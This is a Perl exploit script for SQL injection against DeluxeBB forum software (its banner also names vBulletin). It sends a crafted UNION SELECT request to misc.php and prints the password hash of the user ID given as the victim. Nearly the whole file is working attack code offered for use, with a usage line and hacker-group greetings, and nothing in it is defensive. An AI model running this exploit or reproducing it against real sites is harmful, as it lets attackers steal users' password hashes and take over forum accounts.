#!/usr/bin/perl

use IO::Socket;


print q{
######################################################
#   DeluxeBB  Remote SQL Injection Exploit           #
#   vbulletin Remote SQL Injection Exploit           #
#      //  SekoMirza // Turkish Hackerz              #
######################################################
};

if (!$ARGV[2]) {

print q{
        Usage: perl dbbxpl.pl host /directory/ victim_userid

       perl dbbxpl.pl www.somesite.com /forum/ 1


};

}


$server = $ARGV[0];
$dir    = $ARGV[1];
$user   = $ARGV[2];
$myuser = $ARGV[3];
$mypass = $ARGV[4];
$myid   = $ARGV[5];

print "------------------------------------------------------------------------------------------------\r\n";
print "[>] SERVER: $server\r\n";
print "[>]    DIR: $dir\r\n";
print "[>] USERID: $user\r\n";
print "------------------------------------------------------------------------------------------------\r\n\r\n";

$server =~ s/(http:\/\/)//eg;

$path  = $dir;
$path .=
"misc.php?sub=profile&name=0')+UNION+SELECT+0,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+FROM%20deluxebb_users%

20WHERE%20(uid='".$user ;


print "[~] PREPARE TO CONNECT...\r\n";

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80") || die "[-] CONNECTION FAILED";

print "[+] CONNECTED\r\n";
print "[~] SENDING QUERY...\r\n";
print $socket "GET $path HTTP/1.1\r\n";
print $socket "Host: $server\r\n";
print $socket "Accept: */*\r\n";
print $socket "Connection: close\r\n\r\n";
print "[+] DONE!\r\n\r\n";



print "--[ REPORT ]------------------------------------------------------------------------------------\r\n";
while ($answer = <$socket>)
{

 if ($answer =~/(\w{32})/)
{

  if ($1 ne 0) {
   print "Password Hash is: ".$1."\r\n";
print "--------------------------------------------------------------------------------------\r\n";

      }
exit();
}

}
print "------------------------------------------------------------------------------------------------\r\n";

#########################################################
#Shoutz:                                                #
#                                                       #
# My Sweet -> Caramel                                   #
# For Mp3s -> Hypn0sis                                  #
# For Support -> [WwW.StarHack.Org]                     #
# My Bro -> PhantomOrchid                               #
# My Preceptor -> Earnk Kazno                           #
#########################################################

